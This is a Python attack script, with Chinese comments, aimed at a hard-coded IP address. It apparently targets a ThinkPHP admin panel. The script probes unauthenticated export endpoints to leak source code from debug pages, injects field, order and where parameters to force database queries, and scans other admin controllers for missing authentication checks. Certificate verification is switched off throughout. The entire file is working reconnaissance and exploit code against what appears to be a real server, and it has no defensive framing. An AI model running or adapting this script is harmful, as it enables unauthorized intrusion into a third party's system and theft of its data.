#!/usr/bin/env python3
"""tp_data_exfil.py - 利用Export无鉴权执行SQL查询提取数据"""
import urllib.request, urllib.parse, ssl, re, sys, json

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=10, context=ctx)
        return r.status, r.read(250000).decode("utf-8", "ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(250000).decode("utf-8", "ignore"), dict(e.headers)
    except Exception as e:
        return 0, repr(e)[:150], {}

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

# 1. 用order等其他方法触发不同源码窗口
print("=== 1. Export其他方法源码 ===", flush=True)
seen = {}
for m in ["orderlist", "userlist", "productlist", "goods", "orders", "users", "products",
          "goodsexport", "orderExport", "userExport", "member", "memberlist"]:
    st, b, hdrs = get(BASE + "/admin/export/%s.html?num=5" % m)
    l = leak_lines(b)
    if l:
        new = {k: v for k, v in l.items() if k not in seen}
        if new:
            print("  %s: +%d lines" % (m, len(new)), flush=True)
            seen.update(new)

print("\n=== 2. 泄露新源码 ===", flush=True)
for ln in sorted(seen):
    print("  %4d: %s" % (ln, seen[ln][:130]), flush=True)

# 3. 尝试各种模型加载方式让查询执行
print("\n=== 3. 数据库查询执行尝试 ===", flush=True)
# 让getExportGoods变成模型scope或value调用
for url in ["/admin/export/goodslist.html?num=5&page=1&field=id",
            "/admin/export/goodslist.html?num=5&page=1&order=g.id",
            "/admin/export/goodslist.html?num=5&page=1&where[id]=1"]:
    st, b, hdrs = get(BASE + url)
    if "variable type error" in b:
        print("  %s -> array-error (data returned!)" % url.split("?")[1], flush=True)
    elif "method not exist" in b:
        print("  %s -> method-not-exist" % url.split("?")[1], flush=True)
    else:
        print("  %s -> st=%d size=%d" % (url.split("?")[1], st, len(b)), flush=True)
        if st == 200 and len(b) > 100 and "跳转" not in b:
            print("    BODY: %s" % b[:300], flush=True)

# 4. 尝试直接访问其他无鉴权方法(daochuExcel等)
print("\n=== 4. 其他控制器无鉴权探测 ===", flush=True)
for p in ["/admin/order/daochuExcel.html?num=5", "/admin/order/daochuExcel.html",
          "/admin/banner/bannerInt.html?num=5", "/admin/system/updateStatus.html?num=5",
          "/admin/log/logAddUp.html?num=5"]:
    st, b, hdrs = get(BASE + p)
    l = leak_lines(b)
    if l and any("public function" in v or "input(" in v for v in l.values()):
        print("  %s: source leaked!" % p, flush=True)
        for ln in sorted(l):
            print("    %4d: %s" % (ln, l[ln][:100]), flush=True)
    elif "variable type error" in b:
        print("  %s: array-error (executed!)" % p, flush=True)
    else:
        print("  %s: st=%d size=%d %s" % (p, st, len(b), "login" if "跳转" in b else ""), flush=True)
print("=== DONE ===", flush=True)
